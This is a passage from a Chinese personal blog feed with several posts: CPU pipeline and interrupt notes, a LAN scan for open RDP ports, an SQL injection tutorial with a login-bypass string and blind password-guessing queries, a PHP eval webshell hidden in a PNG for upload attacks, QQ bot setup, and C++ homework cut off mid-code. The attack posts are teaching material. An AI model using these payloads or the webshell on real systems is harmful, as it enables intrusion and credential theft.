id="取值周期数据流">取值周期数据流</h5><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785527767-0c2e5515-bc08-4ba8-a3b4-c6335c3ef456.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=u2cf9024d&amp;originHeight=305&amp;originWidth=568&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=ue62c4795-43c2-478a-87d0-5bdfb1dd0c3&amp;title=" alt=""></p><h5 id="间址周期数据流">间址周期数据流</h5><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785528096-cc2fa634-e8cd-436e-95a4-b3412c425102.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=ubddbb413&amp;originHeight=308&amp;originWidth=580&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=ucbbe99c2-1f94-42e2-832a-8959c56c50a&amp;title=" alt=""></p><h5 id="执行周期数据流–不同指令的执行周期数据流不同">执行周期数据流–不同指令的执行周期数据流不同</h5><h5 id="中断周期数据流">中断周期数据流</h5><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785528163-df03badf-73ff-416e-a6c8-b7f4cb623c56.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=uad41c097&amp;originHeight=282&amp;originWidth=588&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=ue6873f80-26bd-4769-9c4d-0dbd0892f1f&amp;title=" alt=""></p><hr><h3 id="影响指令流水线性能的因素">影响指令流水线性能的因素</h3><table><thead><tr><th>因素</th><th>解释</th><th>解决</th></tr></thead><tbody><tr><td>结构相关</td><td>不同指令争用同一功能部件产生资源冲突使指令流水出现停顿，影响流水线效率</td><td>停顿、指令存储器和数据存储器分开、指令预取技术</td></tr><tr><td>数据相关</td><td>不同指令因重叠操作，可能改变操作数的 读/写 访问顺序</td><td>后推法、采用旁路技术</td></tr><tr><td>控制相关</td><td>由转移指令引起</td><td>今早判别转移是否发生、及早生成转移目标地址、预取转移成功或不成功两个控制流方向上的目标指令、加快和提前形成条件码等</td></tr></tbody></table><hr><h3 id="流水线性能">流水线性能</h3><table><thead><tr><th>指标</th><th>性能</th></tr></thead><tbody><tr><td>吞吐率</td><td>单位时间内 流水线所完成指令 或输出结果的数量</td></tr><tr><td>加速比</td><td>m 段的流水线的速度与等功能的非流水线的速度之比</td></tr><tr><td>效率</td><td>流水线中各功能段的 利用率</td></tr></tbody></table><h4 id="流水线的多发技术">流水线的多发技术</h4><h6 id="超标量技术、超流水线技术、超长指令字技术">超标量技术、超流水线技术、超长指令字技术</h6><h4 id="流水线结构">流水线结构</h4><h5 id="指令流水线结构">指令流水线结构</h5><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785528148-eb198c3c-25df-4511-b818-ffe949124709.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=u751dc379&amp;originHeight=354&amp;originWidth=580&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u569edcec-e31a-4d8c-8cf5-4530164551d&amp;title=" alt=""></p><h5 id="运算流水线">运算流水线</h5><p><img src="https://cdn.nlark.com/yuque/0/2022/png/26706455/1648785528496-986d7c5b-398f-4776-a464-4bb52a35061c.png#clientId=u1bdf1067-a80d-4&amp;crop=0&amp;crop=0&amp;crop=1&amp;crop=1&amp;from=paste&amp;id=u09e00090&amp;originHeight=342&amp;originWidth=443&amp;originalType=url&amp;ratio=1&amp;rotation=0&amp;showTitle=false&amp;status=done&amp;style=none&amp;taskId=u814181a5-b127-4670-abf8-2930188e340&amp;title=" alt=""></p><hr><h3 id="中断请求">中断请求</h3><h4 id="中断请求标记、中断判优逻辑、（硬件排队、软件排队）">中断请求标记、中断判优逻辑、（硬件排队、软件排队）</h4><h4 id="中断响应">中断响应</h4><h5 id="响应中断的条件：允许中断触发器-EINT-1">响应中断的条件：允许中断触发器 EINT = 1</h5><h5 id="响应中断的-时间：指令执行周期结束时刻由-CPU-发查询信号">响应中断的 时间：指令执行周期结束时刻由 CPU 发查询信号</h5><h5 id="中断隐指令">中断隐指令</h5><h6 id="1-保护程序断点">1.保护程序断点</h6><h6 id="2-寻找服务程序入口地址">2.寻找服务程序入口地址</h6><h6 id="3-硬件-关中断">3.硬件 关中断</h6><hr><h3 id="保护现场和恢复现场">保护现场和恢复现场</h3><h6 id="程序断点保护和保护-CPU-内部个寄存器内容">程序断点保护和保护 CPU 内部个寄存器内容</h6><h4 id="中断屏蔽技术">中断屏蔽技术</h4><h5 id="1-多重中断的概念">1.多重中断的概念</h5><h5 id="2-实现多重中断的条件">2.实现多重中断的条件</h5><h6 id="1-提前设置“开中断”指令">1).提前设置“开中断”指令</h6><h6 id="2-优先级别高的中断源有权中断优先级别低的中断源">2).优先级别高的中断源有权中断优先级别低的中断源</h6><h5 id="3-屏蔽技术">3.屏蔽技术</h5><h6 id="1-屏蔽触发器和屏蔽字">1).屏蔽触发器和屏蔽字</h6><h6 id="2-屏蔽技术可改变优先等级">2).屏蔽技术可改变优先等级</h6><h6 id="3-屏蔽技术的其他应用">3).屏蔽技术的其他应用</h6><h5 id="4-多重中断的断点保护">4.多重中断的断点保护</h5><hr><h1>第九章 控制单元功能</h1><h3 id="取值周期">取值周期</h3><h6 id="PC-MAR">PC-&gt;MAR</h6><h6 id="1-R">1-&gt;R</h6><h6 id="M-MAR-MDR">M(MAR)-&gt;MDR</h6><h6 id="MDR-IR">MDR-&gt;IR</h6><h6 id="OP-IR-CU">OP(IR)-&gt;CU</h6><h6 id="PC-1-PC">(PC)+1-&gt;PC</h6><h3 id="间址周期">间址周期</h3><h6 id="Ad-IR-MAR">Ad(IR)-&gt;MAR</h6><h6 id="1-R-2">1-&gt;R</h6><h6 id="M-MAR-MDR-2">M(MAR)-&gt;MDR</h6><h6 id="MDR-Ad-IR">MDR-&gt;Ad(IR)</h6><h3 id="执行周期">执行周期</h3><table><thead><tr><th>指令类别</th><th>步骤</th></tr></thead><tbody><tr><td>非访存指令</td><td>0-&gt;ACC、<em>ACC</em>¯¯¯¯¯¯¯¯¯¯¯-&gt;ACC、L(ACC)-&gt;R(ACC),_ACC_0-&gt;_ACC_0、R(ACC)-&gt;L(ACC),_ACC_0-&gt;_ACC_0、0-&gt;G</td></tr></tbody></table><table><thead><tr><th>、0-&gt;G</th><th></th></tr></thead><tbody><tr><td>访存指令-加法指令</td><td>ADD X、Ad(IR)-&gt;MAR、1-&gt;R、M(MAR)-&gt;MDR、(ACC)+(MDR)-&gt;ACC</td></tr><tr><td>访存指令-存数指令</td><td>STA X、Ad(IR)-&gt;MAR、1-&gt;W、ACC-&gt;MDR、MDR-&gt;M(MAR)</td></tr><tr><td>访存指令-取数指令</td><td>LDA x、Ad(IR)-&gt;MAR、1-&gt;R、M(MAR)-&gt;MDR、MDR-ACC</td></tr><tr><td>转移指令-无条件转移</td><td>JMP x、Ad(IR)-&gt;PC</td></tr><tr><td>转移指令-条件转移</td><td>BAN X(负则转)、<em>A_0∗_Ad</em>(<em>IR</em>)+<em>A_0¯¯¯¯¯¯(_PC</em>)−&gt;<em>PC</em></td></tr></tbody></table><table><thead><tr><th></th></tr></thead></table><h3 id="中断周期">中断周期</h3><h6 id="0-MAR">0-&gt;MAR</h6><h6 id="1-W">1-&gt;W</h6><h6 id="PC-MDR">PC-&gt;MDR</h6><h6 id="MDR-M-MAR">MDR-&gt;M(MAR)</h6><h6 id="中断程序识别程序入口地址-M-PC">中断程序识别程序入口地址 M-&gt;PC</h6><h6 id="0-EINT">0-&gt;EINT</h6><hr><h3 id="控制方式">控制方式</h3><table><thead><tr><th>控制方式</th><th>解释</th></tr></thead><tbody><tr><td>同步控制方式</td><td>任一微操作均由统一基准时标的时序信号控制</td></tr><tr><td>异步控制方式</td><td>无基准时标信号、无固定的周期节拍和严格的时钟同步、采用 应答方式</td></tr><tr><td>联合控制方式</td><td>同步与异步相结合</td></tr><tr><td>人工控制方式</td><td>Reset、连续和单条指令执行转换开关、符合停机开关</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 🔔魔法铃铛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机组成原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>局域网内对应端口开放的主机（Linux）</title>
      <link href="/posts/omwx46/"/>
      <url>/posts/omwx46/</url>
      
        <content type="html"><![CDATA[<h2 id="前言-8">前言</h2><p>当你有一台 Linux 机子，而你又不知道同网络下开放一个特定端口的 IP，并且你又十分想知道，<br>你可以使用下面这个命令<br>如果你只想知道局域网内所有的 IP 可以使用 arp 命令</p><h2 id="快速开始-6">快速开始</h2><p>过滤显示所有可以连接这个端口的 ip 地址</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">bash &lt;&lt; <span class="string">&#x27;EOL&#x27;</span></span><br><span class="line"><span class="comment">#!/bin/sh</span></span><br><span class="line"><span class="comment"># echo -e &quot;\n\n\n&quot;</span></span><br><span class="line">clear</span><br><span class="line">ipb=192.168.2</span><br><span class="line">ip=0 <span class="comment">#修改初值</span></span><br><span class="line"><span class="keyword">while</span> (( <span class="variable">$ip</span> &lt;= 254 )); <span class="keyword">do</span></span><br><span class="line">telnet <span class="variable">$ipb</span>.<span class="variable">$ip</span> 3389 2&gt; /dev/null  | grep Connected &amp;</span><br><span class="line">ip=`<span class="built_in">expr</span> <span class="variable">$ip</span> + 1`</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">EOL</span><br></pre></td></tr></table></figure><h2 id="命令解释">命令解释</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">telnet <span class="variable">$ipb</span>.<span class="variable">$ip</span> 3389 2&gt; /dev/null</span><br></pre></td></tr></table></figure><ol><li><code>/dev/null</code> 是一个特殊的文件，写入到它的内容都会被丢弃；如果尝试从该文件读取内容，那么什么也读不到。但是 /dev/null 文件非常有用，将命令的输出重定向到它，会起到&quot;禁止输出&quot;的效果</li><li><code>192.168.2.0 ~ 192.168.2.254</code> 之间挨个测试 3389 端口是否可以使用</li><li><code>2&gt;</code> 为把标准错误文件(stderr)重定向到/dev/null 中</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep Connected</span><br></pre></td></tr></table></figure><p>过滤显示可以<code>Connected</code>端口的 IP</p><h2 id="小结-3">小结</h2><p>这个改改就是 shell 脚本了</p>]]></content>
      
      
      <categories>
          
          <category> 🍊魔法橙子 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入攻击之简单实例</title>
      <link href="/posts/qpht7q/"/>
      <url>/posts/qpht7q/</url>
      
        <content type="html"><![CDATA[<h2 id="前言-10">前言</h2><p>SQL 注入攻击指的是通过构建特殊的输入作为参数传入 Web 应用程序，而这些输入大都是 SQL 语法里的一些组合，通过执行 SQL 语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。</p><h2 id="sql-注入">sql 注入</h2><div class="note primary no-icon flat"><p>在无过滤特殊字符，无判断密码的一个简单的网页情况下</p></div><p>用户名：admin 密码：admin</p><ol><li>登录进入，此为万能密码</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot; or 1=1--&quot;</span></span><br></pre></td></tr></table></figure><p>1=1 表达式 恒为真，–注释作用</p><ol start="2"><li>猜解数据库表名</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/login.php?pass=admin&amp;name=admin<span class="string">&#x27; and (select count(*) from data)&gt;0 and &#x27;</span>a<span class="string">&#x27;=&#x27;</span>a<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>成功，说明数据表名确为 data；若不成功，则可反复测试，直至成功猜出表名</p><ol start="3"><li>猜解数据库字段名</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/login.php?pass=admin&amp;name=admin<span class="string">&#x27;and (select count(uname) from data)&gt;0 and &#x27;</span>a<span class="string">&#x27;=&#x27;</span>a<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>若用户名字段确为 uname，则提示登录成功</p><p>同理可猜出密码字段为 upass</p><ol start="4"><li>猜解密码长度</li></ol><p>已知有一用户名为&quot;wucm&quot;，首先猜其密码长度大于 1，然后以此类推</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/login.php?pass=admin&amp;name=admin<span class="string">&#x27; and (Select count(*) from data where uname=&#x27;</span>wucm<span class="string">&#x27; and len(upass)&gt;1)&gt;0 and &#x27;</span>a<span class="string">&#x27;=&#x27;</span>a<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><ol start="5"><li>猜解密码</li></ol><p>测试第一位是否为数字，以此类推</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/login.php?pass=admin&amp;name=admin<span class="string">&#x27; and (Select count(*) from data where uname=&#x27;</span>wucm<span class="string">&#x27; and mid(upass,1,1)&lt;&#x27;</span>9<span class="string">&#x27;)&gt;0 and &#x27;</span>a<span class="string">&#x27;=&#x27;</span>a<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>测试第一位是否位字母，以此类推</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/login.php?pass=admin&amp;name=admin<span class="string">&#x27; and (Select count(*) from data where uname=&#x27;</span>wucm<span class="string">&#x27; and mid(upass,1,1)&gt;&#x27;</span>a<span class="string">&#x27;)&gt;0 and &#x27;</span>a<span class="string">&#x27;=&#x27;</span>a<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="解决方式">解决方式</h2><ol><li>通过前端<code>JavaScript</code>过滤特殊字符</li><li>使用安全函数 <code>mysqli</code></li><li>使用比较成熟的前端框架</li></ol><h2 id="小结-5">小结</h2><div class="note info no-icon flat"><p>多用框架基本上莫问题，这种注入基本上莫用 😛</p></div>]]></content>
      
      
      <categories>
          
          <category> 🐇魔法兔兔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安 </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图片上传漏洞</title>
      <link href="/posts/mhbbc6/"/>
      <url>/posts/mhbbc6/</url>
      
        <content type="html"><![CDATA[<h2 id="前言-7">前言</h2><ol><li><p>文件上传漏洞是指由于程序员在对用户文件上传部分的控制不足或者处理缺陷，而导致的用户可以越过其本身权限向服务器上上传可执行的动态脚本文件。</p></li><li><p>这种攻击方式是最为直接和有效的，“文件上传”本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。</p></li><li><p>文件上传漏洞本身就是一个危害巨大的漏洞，WebShell 更是将这种漏洞的利用无限扩大。大多数的上传漏洞被利用后攻击者都会留下 WebShell 以方便后续进入系统。</p></li></ol><p>中国蚁剑是一款开源的跨平台网站管理工具，它主要面向于合法授权的渗透测试安全人员以及进行常规操作的网站管理员。是一款非常优秀的 webshell 管理工具。</p><div class="note info no-icon flat"><p>系统：kail</p><p>工具：中国蚁剑</p></div><h2 id="快速开始-5">快速开始</h2><ol><li>在 kali 里使用 <code>mimetype</code> 查看文件类型，图片类型为 png</li></ol><p><img src="https://cdn.jsdelivr.net/gh/Cheng1622/image/t1.24d89n18nt4w.png#alt=%E5%88%A4%E6%96%AD%E5%8E%9F%E5%9B%BE%E7%B1%BB%E5%9E%8B" alt=""></p><ol start="2"><li>创建一个 PHP 文件</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/桌面/1.php</span><br></pre></td></tr></table></figure><ol start="3"><li>下面为 PHP 的一句话木马，写入 PHP 文件内</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br></pre></td></tr></table></figure><ol start="4"><li>把 PHP 文件加入到图片末尾</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> ~/桌面/1.php &gt;&gt; ~/桌面/1.png</span><br></pre></td></tr></table></figure><ol start="5"><li>判断现在的图片类型，发现图片类型已经变为 PHP</li></ol><p><img src="https://cdn.jsdelivr.net/gh/Cheng1622/image/t2.5ac4jmdvok80.png#alt=%E5%88%A4%E6%96%AD%E7%8E%B0%E5%9C%A8%E7%B1%BB%E5%9E%8B" alt=""></p><ol start="6"><li><p>打开蚁剑，右键添加数据</p></li><li><p>将木马图片地址输入到蚁剑，输入之前一句话木马中预设的密码，有账号密码的情况下别忘了用 cookie</p></li><li><p>测试链接，此时蚁剑已经成功链接目标，可以对文件，数据等进行操作，甚至以管理员身份发出命令</p></li></ol><h2 id="小结-2">小结</h2><p>现在的系统安全做的都特别好，像这种一句话木马一下子就能识别出来，隔离并报警告</p><div class="note primary no-icon flat"><p>该文章仅供技术学习，请勿用于非法途径</p></div>]]></content>
      
      
      <categories>
          
          <category> 🐇魔法兔兔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网安 </tag>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于go-cqhttp实现QQ机器人（Linux）</title>
      <link href="/posts/pqy51r/"/>
      <url>/posts/pqy51r/</url>
      
        <content type="html"><![CDATA[<h2 id="前言-9">前言</h2><ol><li>go-cqhttp 支持 linux 和 windows 系统</li><li>go-cqhttp 模拟了 qq 的客户端，同时提供了一系列的接口，用来收发信息。</li></ol><p>处理流程：go-cqhttp 从获取登录账号的 qq 时间，通过 http 或者 websocket 传给后台（编写后台程序就是我们的工作）进行处理，等后台处理完之后，通过 go-cqhttp 的接口向 qq 进行发消息，撤回等操作。</p><div class="note primary flat"><ol><li>http 和反向 ws 只需要配置一个即可，配置多个会出现同一个消息发两次的情况。</li><li>若使用 CQ 码发 p 站图片，需要配置代理</li></ol></div><h2 id="快速开始-7">快速开始</h2><p>官方文档 <a href="https://docs.go-cqhttp.org/">https://docs.go-cqhttp.org/</a></p><p>下载 go-cqhttp <a href="https://github.com/Mrs4s/go-cqhttp/releases">https://github.com/Mrs4s/go-cqhttp/releases</a></p><div class="note warning flat"><p>最好运行两天再开始让机器人发消息，防风控（貌似有效）</p><p>最好拿时间久、经常用的小号</p></div><h3 id="下载-解压">下载-解压</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/Mrs4s/go-cqhttp/releases/download/v1.0.0-rc1/go-cqhttp_linux_amd64.tar.gz</span><br><span class="line">tar -zxvf go-cqhttp_linux_amd64.tar.gz</span><br><span class="line"><span class="built_in">mv</span> go-cqhttp_linux_amd64 bot</span><br></pre></td></tr></table></figure><h3 id="运行-配置">运行-配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> bot</span><br><span class="line">./go-cqhttp</span><br></pre></td></tr></table></figure><p>运行时，会出现选项，一般选个 1 就够了</p><p>自动生成一个配置文件<code>config.yml</code>，编辑配置文件，输入你的 QQ 号码</p><p>再次运行，扫码成功后，会新生成的文件，data 和 logs 是本地记录，device.json 是自动生成的设备信息</p><h3 id="参考配置：">参考配置：</h3><p>心跳事件每隔 xx 秒向 tx 的服务器发送一条空信息，证明这个 Q 号还活着防止 tx 把我踢下线</p><p>建议不要关闭，橙子发现关闭后风控了 😭</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">heartbeat:</span></span><br><span class="line">  <span class="attr">disabled:</span> <span class="literal">false</span> <span class="comment"># 是否开启心跳事件上报</span></span><br><span class="line">  <span class="comment"># 心跳频率, 单位秒</span></span><br><span class="line">  <span class="comment"># -1 为关闭心跳</span></span><br><span class="line">  <span class="attr">interval:</span> <span class="number">5</span></span><br></pre></td></tr></table></figure><p>host、port 用来监听信息，post 用来发送信息，按需求更改</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">servers:</span></span><br><span class="line">  <span class="comment"># HTTP 通信设置</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">http:</span></span><br><span class="line">      <span class="comment"># 是否关闭正向HTTP服务器</span></span><br><span class="line">      <span class="attr">disabled:</span> <span class="literal">false</span></span><br><span class="line">      <span class="comment"># 服务端监听地址，用来收QQ信息，可自己设置其它地址</span></span><br><span class="line">      <span class="attr">host:</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">      <span class="comment"># 服务端监听端口，用来收QQ信息，可自己设置其它端口</span></span><br><span class="line">      <span class="attr">port:</span> <span class="number">5700</span></span><br><span class="line">      <span class="comment"># 反向HTTP超时时间, 单位秒</span></span><br><span class="line">      <span class="comment"># 最小值为5，小于5将会忽略本项设置</span></span><br><span class="line">      <span class="attr">timeout:</span> <span class="number">5</span></span><br><span class="line">      <span class="attr">middlewares:</span></span><br><span class="line">        <span class="string">&lt;&lt;:</span> <span class="string">*default</span> <span class="comment"># 引用默认中间件</span></span><br><span class="line">      <span class="comment"># 反向HTTP POST地址列表</span></span><br><span class="line">      <span class="attr">post:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">url:</span> <span class="string">&#x27;127.0.0.1:5701&#x27;</span> <span class="comment"># 这个url用来发送信息，可自己设置其它地址</span></span><br><span class="line">          <span class="attr">secret:</span> <span class="string">&#x27;&#x27;</span>           <span class="comment"># 密钥不要写，就这样空着</span></span><br></pre></td></tr></table></figure><h3 id="服务-2">服务</h3><p>每次都这么运行多麻烦，还是设置服务开机自启比较省事</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/systemd/system/bot.service</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=go-cqhttp Service</span><br><span class="line">After=network.target nss-lookup.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">User=root</span><br><span class="line">WorkingDirectory=/root/bot</span><br><span class="line"></span><br><span class="line">ExecStart=/root/bot/go-cqhttp</span><br><span class="line"></span><br><span class="line">Restart=on-failure</span><br><span class="line">RestartPreventExitStatus=23</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart bot.service</span><br><span class="line">systemctl <span class="built_in">enable</span> bot.service</span><br></pre></td></tr></table></figure><h2 id="小结-4">小结</h2><p>恭喜你已经成功拥有了一个 QQ 机器人，同时<s>祈祷大佬别跑路，go-cqhttp 别阵亡</s></p>]]></content>
      
      
      <categories>
          
          <category> 🍊魔法橙子 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> go-cqhttp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>c++之实验课作业</title>
      <link href="/posts/xxz26y/"/>
      <url>/posts/xxz26y/</url>
      
        <content type="html"><![CDATA[<h2 id="前言-12">前言</h2><p>橙子的 c++作业罢了</p><p>希望大家用得上</p><h2 id="实验一">实验一</h2><h3 id="1-采用-Visual-C-创建一个求解两个任意正整数最大公因数的控制台应用程序。">1. 采用 Visual C++创建一个求解两个任意正整数最大公因数的控制台应用程序。</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">func</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (a &lt; b) &#123;</span><br><span class="line"><span class="type">int</span> t = a; a = b; b = t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> c = a % b;</span><br><span class="line"><span class="keyword">while</span> (c != <span class="number">0</span>) &#123;</span><br><span class="line">a = b; b = c;c = a % b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="type">int</span> a, b;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;请输入两个整数(注意：两数之间空格隔开):&quot;</span>;</span><br><span class="line">cin &gt;&gt; a &gt;&gt; b;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;他们的公因数为：&quot;</span> &lt;&lt; <span class="built_in">func</span>(a, b) &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-采用-Visual-C-创建一个求解-ax2-bx-c-0-方程实根的应用程序，其中-a-b-c-三个常数项为任意双精度浮点数。">2. 采用 Visual C++创建一个求解 ax2+bx+c=0 方程实根的应用程序，其中 a,b,c 三个常数项为任意双精度浮点数。</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> </span>&#123;</span><br><span class="line"><span class="type">double</span> a, b, c, d, x1, x2, realPart, maginaryPart;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;请输入a，b，c的值&quot;</span> &lt;&lt; endl;</span><br><span class="line">cin &gt;&gt; a &gt;&gt; b &gt;&gt; c;</span><br><span class="line">d = b * b - <span class="number">4</span> * a * c;</span><br><span class="line"><span class="keyword">if</span> (d &gt; <span class="number">0</span>) &#123;</span><br><span class="line">x1 = (-b + <span class="built_in">sqrt</span>(d)) / (<span class="number">2</span> * a);</span><br><span class="line">x2 = (-b - <span class="built_in">sqrt</span>(d)) / (<span class="number">2</span> * a);</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;此时有两个不同的根&quot;</span> 